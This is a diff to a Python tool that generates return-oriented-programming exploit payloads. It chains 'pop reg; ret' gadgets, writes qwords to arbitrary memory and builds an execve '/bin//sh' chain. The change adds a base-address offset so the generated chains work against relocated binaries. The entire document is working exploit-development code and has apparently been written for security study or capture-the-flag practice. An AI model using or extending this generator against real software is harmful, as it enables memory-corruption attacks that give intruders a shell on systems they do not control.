@@ -27,7 +27,7 @@ def getPaddingAndClobbers(insns):
     return (pad, regs)
 
 def writeGadget(gadget):
-    return "payload += struct.pack('<Q', " + hex(int(gadget[0].address)) + ")\t\t# " + str(gadget) + "\n\t"
+    return "payload += struct.pack('<Q', offset+" + hex(int(gadget[0].address)) + ")\t\t# " + str(gadget) + "\n\t"
 
 def writePadding(n):
     acc = ''
@@ -53,12 +53,12 @@ def makeLoadConstIntoRegSeq(gadgetList, reg, noClobber):
         if any([x in noClobber for x in clobbers]):
             continue
         # "pop Reg; . . . ; ret" is found
-        def loadConstIntoReg(const, comment = ''):
+        def loadConstIntoReg(const, comment = '', isOffset = False):
             # Write our output code:
             # Write address of "pop Reg; ret"
             ret = writeGadget(gadget)
             # Write const onto stack
-            ret += "payload += struct.pack('<Q', " + hex(const) + ")"
+            ret += "payload += struct.pack('<Q', " + ("offset+" if isOffset else '') + hex(const) + ")"
             if comment:
                 ret += '\t\t# ' + comment
             ret += "\n\t"
@@ -69,7 +69,8 @@ def makeLoadConstIntoRegSeq(gadgetList, reg, noClobber):
 
     raise Exception("Unable to find necessary gadgets to load a value into register " + reg)
 
-def LoadConstIntoReg(gadgetList, reg, noClobber, const): return makeLoadConstIntoRegSeq(gadgetList, reg, noClobber)(const)
+def LoadConstIntoReg(gadgetList, reg, noClobber, const, comment = '', isOffset = False):
+    return makeLoadConstIntoRegSeq(gadgetList, reg, noClobber)(const, comment, isOffset)
 
 def getMovQwordGadgets(gadgets):
     movQwordGadgets = list()
@@ -91,13 +92,13 @@ def makeQwordLoadSeq(gadgetList):
         try:
             loadSrcSeq = makeLoadConstIntoRegSeq(gadgetList, src, [])
             loadDestSeq = makeLoadConstIntoRegSeq(gadgetList, dest, [src])
-            return lambda qword, addr: loadSrcSeq(qword, str(struct.pack("<Q", qword))) + loadDestSeq(addr, "Location to write") + writeGadget(g)
+            return lambda qword, addr: loadSrcSeq(qword, str(struct.pack("<Q", qword))) + loadDestSeq(addr, "Location to write", True) + writeGadget(g)
         except Exception:
             pass
         try:
             loadDestSeq = makeLoadConstIntoRegSeq(gadgetList, dest, [], qword)
             loadSrcSeq = makeLoadConstIntoRegSeq(gadgetList, src, [dest], qword)
-            return lambda qword, addr: loadDestSeq(addr, "Location to write") + loadSrcSeq(qword, str(struct.pack("<Q", qword))) + writeGadget(g)
+            return lambda qword, addr: loadDestSeq(addr, "Location to write", True) + loadSrcSeq(qword, str(struct.pack("<Q", qword))) + writeGadget(g)
         except Exception:
             continue 
     raise Exception("Could not combine gadgets to write to arbitary memory.") 
@@ -139,6 +140,9 @@ if __name__ == '__main__' :
 \t# Enter the amount of junk required
 \tpayload = ''
 \t
+\t# Enter offset of the binary loaded in memory
+\toffset = 0
+\t
 \t'''
 
 footer='''
@@ -175,7 +179,7 @@ def execve_bin_sh(GadgetList, data_section_addr) :
     fd.write(LoadConstIntoReg(GadgetList, "rax", [], 59))
 
 	# Step-2: rdi <- "Address of /bin//sh" - .data section's address
-    fd.write(LoadConstIntoReg(GadgetList, "rdi", ["rax"], data_section_addr))
+    fd.write(LoadConstIntoReg(GadgetList, "rdi", ["rax"], data_section_addr, isOffset = True))
 
 	# Step-3: rsi <- 0
     fd.write(LoadConstIntoReg(GadgetList, "rsi", ["rax", "rdi"], 0))
